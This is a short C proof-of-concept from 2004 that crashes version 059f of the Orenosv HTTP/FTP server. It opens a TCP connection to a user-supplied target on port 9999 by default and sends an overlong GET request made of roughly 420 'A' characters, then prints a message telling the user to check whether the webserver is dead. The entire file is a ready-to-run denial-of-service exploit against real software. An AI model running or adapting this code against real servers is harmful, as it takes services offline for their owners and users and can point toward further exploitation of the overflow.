/****************************/
   PoC to crash the server
/****************************/

/* Orenosv HTTP/FTP Server Denial Of Service

   Version:
   orenosv059f

   Vendor:
   http://hp.vector.co.jp/authors/VA027031/orenosv/index_en.html

   Coded and Discovered by:
   badpack3t <badpack3t@security-protocols.com>
   .:sp research labs:.
   www.security-protocols.com
   5.25.2004
 */

#include <winsock2.h>
#include <stdio.h>

#pragma comment(lib, "ws2_32.lib")

char exploit[] =

/* 420 A's - looks ugly but owell */
"GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.0\r\n\r\n";

int main(int argc, char *argv[])
{
        WSADATA wsaData;
        WORD wVersionRequested;
        struct hostent  *pTarget;
        struct sockaddr_in      sock;
        char *target;
        int port,bufsize;
        SOCKET mysocket;

        if (argc < 2)
        {
                printf("Orenosv HTTP/FTP Server DoS by badpack3t\r\n\r\n", argv[0]);
                printf("Usage:\r\n %s <targetip> [targetport] (default is 9999)\r\n\r\n", argv[0]);
                printf("www.security-protocols.com\r\n\r\n", argv[0]);
                exit(1);
        }

        wVersionRequested = MAKEWORD(1, 1);
        if (WSAStartup(wVersionRequested, &wsaData) < 0) return -1;

        target = argv[1];
        port = 9999;

        if (argc >= 3) port = atoi(argv[2]);
        bufsize = 1024;
        if (argc >= 4) bufsize = atoi(argv[3]);

        mysocket = socket(AF_INET, SOCK_STREAM, 0);
        if(mysocket==INVALID_SOCKET)
        {
                printf("Socket error!\r\n");
                exit(1);
        }

        printf("Resolving Hostnames...\n");
        if ((pTarget = gethostbyname(target)) == NULL)
        {
                printf("Resolve of %s failed\n", argv[1]);
                exit(1);
        }

        memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
        sock.sin_family = AF_INET;
        sock.sin_port = htons((USHORT)port);

        printf("Connecting...\n");
        if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) )))
        {
                printf("Couldn't connect to host.\n");
                exit(1);
        }

        printf("Connected!...\n");
        printf("Sending Payload...\n");
        if (send(mysocket, exploit, sizeof(exploit)-1, 0) == -1)
        {
                printf("Error Sending the Exploit Payload\r\n");
                closesocket(mysocket);
                exit(1);
        }

        printf("Payload has been sent! Check if the webserver is dead.\r\n");
        closesocket(mysocket);
        WSACleanup();
        return 0;
}

